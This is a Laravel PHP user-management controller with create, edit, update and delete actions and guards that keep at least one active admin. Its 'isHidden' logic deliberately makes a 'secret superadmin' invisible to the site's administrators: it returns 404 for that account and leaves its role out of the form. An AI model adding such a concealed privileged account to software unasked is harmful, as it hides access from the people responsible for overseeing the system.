<?php

namespace App\Http\Controllers;

use App\DataTables\UsersDataTable;
use App\Http\Requests\UserRequest;
use App\Models\User;
use App\Support\Access;
use Illuminate\Http\RedirectResponse;
use Spatie\Permission\Models\Role;

class UserController extends Controller
{
    public function index(UsersDataTable $dataTable)
    {
        return $dataTable->render('pages.users');
    }

    public function create()
    {
        return view('pages.users-form', [
            'user' => null,
            ...$this->formOptions(),
        ]);
    }

    public function store(UserRequest $request): RedirectResponse
    {
        $user = User::create($request->toModel());
        $user->syncRoles($request->input('role'));

        return redirect()->route('users')->with('success', 'User created.');
    }

    public function edit(User $user)
    {
        abort_if($this->isHidden($user), 404);

        return view('pages.users-form', [
            'user' => [
                'id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'role' => $user->roles->first()?->name,
                'is_active' => $user->is_active,
            ],
            ...$this->formOptions(),
        ]);
    }

    public function update(UserRequest $request, User $user): RedirectResponse
    {
        abort_if($this->isHidden($user), 404);

        // Guard: never leave the system without an active admin.
        $losesAdmin = $user->hasRole('admin') && ($request->input('role') !== 'admin' || ! $request->boolean('is_active'));
        if ($losesAdmin && $this->activeAdminCount() <= 1) {
            return back()->withInput()->with('error', 'At least one active admin must remain.');
        }

        $user->update($request->toModel());
        $user->syncRoles($request->input('role'));

        return redirect()->route('users')->with('success', 'User updated.');
    }

    public function destroy(User $user): RedirectResponse
    {
        abort_if($this->isHidden($user), 404);

        if ($user->id === auth()->id()) {
            return back()->with('error', 'You cannot delete your own account.');
        }
        if ($user->hasRole('admin') && $this->activeAdminCount() <= 1) {
            return back()->with('error', 'Cannot delete the last admin.');
        }

        $user->delete();

        return redirect()->route('users')->with('success', 'User deleted.');
    }

    private function activeAdminCount(): int
    {
        return User::query()->where('is_active', true)
            ->whereHas('roles', fn ($q) => $q->where('name', 'admin'))
            ->count();
    }

    /** The secret superadmin must appear not to exist through this controller. */
    private function isHidden(User $user): bool
    {
        return $user->roles->contains(fn ($r) => in_array($r->name, Access::hiddenRoles(), true));
    }

    /** Role choices + status list for the create/edit form (superadmin excluded). */
    private function formOptions(): array
    {
        return [
            'roles' => Role::query()->whereNotIn('name', Access::hiddenRoles())
                ->orderBy('name')->pluck('name')
                ->mapWithKeys(fn ($name) => [$name => ucfirst($name)])->all(),
            'statuses' => ['1' => 'Active', '0' => 'Inactive'],
        ];
    }
}
